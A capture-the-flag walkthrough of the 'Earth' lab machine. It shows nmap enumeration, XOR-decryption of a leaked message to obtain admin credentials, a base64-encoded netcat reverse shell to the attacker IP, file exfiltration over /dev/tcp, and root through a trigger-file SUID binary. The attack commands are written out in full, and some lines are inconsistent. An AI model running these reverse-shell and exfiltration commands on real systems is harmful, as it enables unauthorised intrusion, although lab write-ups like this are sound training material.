# Earth

Attacker_machine_IP := ```10.0.2.4```
Victim_Machine_IP := ```10.0.2.5```

Start by enumerating the system !
```
sudo nmap -sS -p- --open --min-rate 5000 -Pn -n -v 10.0.2.5 -oG allPorts
```

Let's find out all services and versions
```
nmap -sC -sV -p22,80,443 10.0.2.5 -oN targeted
```

The scan shows that we have 2 DNS (for 443 port: Subject Alternative Name). Add them into the ```/etc/hosts```
```
10.0.2.5	earth.local	terratest.earth.local
```

For now, we can't do anything with the ssh service, let's dig into ```80``` and ```443``` ports !
```
whatweb http://10.0.2.5/
```

The output seems not to be the way...The website shows an ```BAD REQUEST (400)``` message.

Let's try with the ```https``` port in your browser !
```
earth.local
```
```
terratest.earth.local/
```
> The first link seems not working... But the second one does !

In the footpage we have these *messages*
```
Previous Messages:

    37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
    
    3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
    
    2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a

```

Whatweb shows that we are on a ```apache server``` let's try some requests !
```
curl https://terratest.earth.local/robot.txt -k
```

We have the following output !
```
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*
```

Notice there's is a file name ```testingnotes.*``` let's try to read it
```
curl https://terratest.earth.local/testingnotes.txt -k
```

We have a to-do list
```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```

Reading the file, we find that ```terra``` is a username ! and there's a file named ```testdata.txt``` !
```
curl https://terratest.earth.local/testdata.txt -k
```

A world history message !
```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

In the ```testingnotes.txt``` it was mentioned that the ```testdata.txt``` was used to test encryption with ```XOR``` encryption method. Also, in the footer main page ```https://terratest.earth.local/``` there are previous messages... Let's try crack them !

We are going to use a online converter from Text to Hexa and then from Hexa to XOR !

I tried the two first ones but there's no useful information/text. Let's try the 3rd one !

First we convert the text from ```testdata.txt``` into hexa ! This will be used as key ! we have
> From Text
```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```
> To Hexa
```
4163636f7264696e6720746f20726164696f6d657472696320646174696e6720657374696d6174696f6e20616e64206f746865722065766964656e63652c20456172746820666f726d6564206f76657220342e352062696c6c696f6e2079656172732061676f2e2057697468696e207468652066697273742062696c6c696f6e207965617273206f66204561727468277320686973746f72792c206c69666520617070656172656420696e20746865206f6365616e7320616e6420626567616e20746f2061666665637420456172746827732061746d6f73706865726520616e6420737572666163652c206c656164696e6720746f207468652070726f6c696665726174696f6e206f6620616e6165726f62696320616e642c206c617465722c206165726f626963206f7267616e69736d732e20536f6d652067656f6c6f676963616c2065766964656e636520696e646963617465732074686174206c696665206d617920686176652061726973656e206173206561726c7920617320342e312062696c6c696f6e2079656172732061676f2e0a
```

You can use this [webpage](https://md5decrypt.net/en/Xor/) or [this](https://www.dcode.fr/xor-cipher) one for decrypting the XOR. So, we enter 
> As input
```
2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a
```

> As Key
```
4163636f7264696e6720746f20726164696f6d657472696320646174696e6720657374696d6174696f6e20616e64206f746865722065766964656e63652c20456172746820666f726d6564206f76657220342e352062696c6c696f6e2079656172732061676f2e2057697468696e207468652066697273742062696c6c696f6e207965617273206f66204561727468277320686973746f72792c206c69666520617070656172656420696e20746865206f6365616e7320616e6420626567616e20746f2061666665637420456172746827732061746d6f73706865726520616e6420737572666163652c206c656164696e6720746f207468652070726f6c696665726174696f6e206f6620616e6165726f62696320616e642c206c617465722c206165726f626963206f7267616e69736d732e20536f6d652067656f6c6f676963616c2065766964656e636520696e646963617465732074686174206c696665206d617920686176652061726973656e206173206561726c7920617320342e312062696c6c696f6e2079656172732061676f2e0a
```

We have the following result (in **TEXT**) !
> if the output is in hexadecimal, convert it to text !
```
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humans
```

Extract the repeated word !
```
earthclimatechangebad4humans
```

We have the ```terra```'s credentials !
```
username: terra
password: earthclimatechangebad4humans
```

So now, let's discover the ```login``` page !
```
gobuster dir -u "http://earth.local" -w /usr/share/dirbuster/directory-list-2.3-medium.txt
```
or
```
wfuzz -c -t 400 --hc=404 -w /usr/share/dirbuster/directory-list-2.3-medium.txt terratest.earth.local/FUZZ
```

We find the ```/admin``` directory. Let's log in !

Once there, We find a CLI command, let's get a revershell !
> Note: I tried with classic commands but no results... Let's try another method !
```
echo "nc -e 10.0.2.4 9000" | base64
```

Have this !
```
bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMi40IDkwMDAK
```

Let's open the listening port !
```
nc -lvnp 9000
```

So, enter this line to the CLI command bar with
```
echo bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMi40IDkwMDAK | base64 -d | bash
```

We have a rever shell as ```apache``` user !
```
bash$ whoami
apache
```

Let's start the root privilege scalation !
```
find / -perm -4000 2>/dev/null
```

There's a binary that seems interesting: ```/usr/bin/reset_root``` !
```
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/reset_root
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
```

Seems to be a local binary, so let's import it to our local machine
> in your local machine
```
nc -lvnp 9001 > reset_root
```
> in your revershell
```
cat /usr/bin/reset_root > /dev/tcp/10.0.2.4/9001
```

Let's analyse this binary !
```
chmod +x reset_passwd
ltrace ./reset_passwd
```

The output shows that the binary verify if the ```/dev/shm/kHgTFI5G```, ```/dev/shm/Zw7bV9U5``` and ```/tmp/kcM0Wewe``` files exist  
```
puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)                     = 38
access("/dev/shm/kHgTFI5G", 0)                                  = -1
access("/dev/shm/Zw7bV9U5", 0)                                  = -1
access("/tmp/kcM0Wewe", 0)                                      = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)                     = 44
+++ exited (status 0) +++
```

In the revershell, let's create them
```
touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe
```

So now let's run the SUID binary !
```
reset_root
```

We have the followin output
```
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth 
```

Let's change the root password !
```
su -l
```
> Enter the password you want !

We are root !
```
[root@earth earth_web]# whoami
root
```

Let's see the root flag in ```/root/root_flag.txt```
```
...
[root_flag_b0da9554d29db2117b02aa8b66ec492e]
```

Let's search the user flag !
```
locate user
```

The output shows lots of paths, but we find this one : ```/var/earth_web/user_flag.txt```. Let's see the flag !
```
[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
```

